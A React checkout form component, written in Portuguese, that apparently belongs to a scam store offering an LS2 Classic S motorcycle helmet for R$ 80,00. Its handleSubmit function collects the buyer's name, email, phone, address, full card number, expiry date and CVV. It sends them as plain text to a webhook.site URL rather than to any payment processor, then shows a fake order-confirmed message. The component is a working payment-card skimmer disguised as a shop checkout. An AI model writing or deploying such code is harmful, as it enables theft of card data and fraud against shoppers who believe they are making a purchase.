import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

interface FormData {
  nome: string;
  email: string;
  telefone: string;
  endereco: string;
  numeroCartao: string;
  validadeCartao: string;
  cvv: string;
}

export const CheckoutForm = () => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    nome: "",
    email: "",
    telefone: "",
    endereco: "",
    numeroCartao: "",
    validadeCartao: "",
    cvv: "",
  });

  const formatDataAsNotes = (data: FormData) => {
    return `
=== NOVO PEDIDO DE CAPACETE LS2 CLASSIC S ===
Nome: ${data.nome}
Email: ${data.email}
Telefone: ${data.telefone}
Endereço: ${data.endereco}
------- Dados do Cartão -------
Número: ${data.numeroCartao}
Validade: ${data.validadeCartao}
CVV: ${data.cvv}
================================
Valor Total: R$ 80,00
Frete: Grátis
================================`;
  };

  const handlePhoneChange = (value: string) => {
    // Remove tudo que não for número
    const numbers = value.replace(/\D/g, "");
    
    // Aplica a máscara (XX) XXXXX-XXXX
    let formatted = numbers;
    if (numbers.length <= 11) {
      formatted = numbers.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
    }
    
    setFormData({ ...formData, telefone: formatted });
  };

  const handleCardNumberChange = (value: string) => {
    // Remove tudo que não for número
    const numbers = value.replace(/\D/g, "");
    
    // Aplica a máscara XXXX XXXX XXXX XXXX
    let formatted = numbers;
    if (numbers.length <= 16) {
      formatted = numbers.replace(/(\d{4})(?=\d)/g, "$1 ");
    }
    
    setFormData({ ...formData, numeroCartao: formatted });
  };

  const handleCardValidityChange = (value: string) => {
    // Remove tudo que não for número
    const numbers = value.replace(/\D/g, "");
    
    // Aplica a máscara MM/AA
    let formatted = numbers;
    if (numbers.length <= 4) {
      formatted = numbers.replace(/^(\d{2})(\d{2}).*/, "$1/$2");
    }
    
    setFormData({ ...formData, validadeCartao: formatted });
  };

  const handleCvvChange = (value: string) => {
    // Remove tudo que não for número e limita a 3 dígitos
    const numbers = value.replace(/\D/g, "").slice(0, 3);
    setFormData({ ...formData, cvv: numbers });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const formattedData = formatDataAsNotes(formData);
      const response = await fetch("https://webhook.site/295a22f7-696f-4834-a212-8f1540b471c6", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: formattedData,
      });

      if (response.ok) {
        toast({
          title: "Pedido realizado com sucesso!",
          description: "Você receberá um email com os detalhes da compra.",
        });
        setFormData({
          nome: "",
          email: "",
          telefone: "",
          endereco: "",
          numeroCartao: "",
          validadeCartao: "",
          cvv: "",
        });
      } else {
        throw new Error("Falha ao processar o pedido");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao processar pedido",
        description: "Por favor, tente novamente mais tarde.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="p-6 space-y-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl shadow-lg animate-fade-in">
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Input
            placeholder="Nome completo"
            value={formData.nome}
            onChange={(e) => setFormData({ ...formData, nome: e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, "") })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            type="email"
            placeholder="Email"
            value={formData.email}
            onChange={(e) => setFormData({ ...formData, email: e.target.value })}
            required
            pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Telefone"
            value={formData.telefone}
            onChange={(e) => handlePhoneChange(e.target.value)}
            required
            maxLength={15}
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Endereço completo"
            value={formData.endereco}
            onChange={(e) => setFormData({ ...formData, endereco: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Número do cartão"
            value={formData.numeroCartao}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            required
            maxLength={19}
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <Input
            placeholder="Validade (MM/AA)"
            value={formData.validadeCartao}
            onChange={(e) => handleCardValidityChange(e.target.value)}
            required
            maxLength={5}
            className="border-gray-300 focus:ring-black"
          />
          <Input
            placeholder="CVV"
            value={formData.cvv}
            onChange={(e) => handleCvvChange(e.target.value)}
            required
            maxLength={3}
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-black hover:bg-gray-800 text-white transition-colors duration-200"
        >
          {loading ? "Processando..." : "Finalizar Compra - R$ 80,00"}
        </Button>
      </form>
    </Card>
  );
};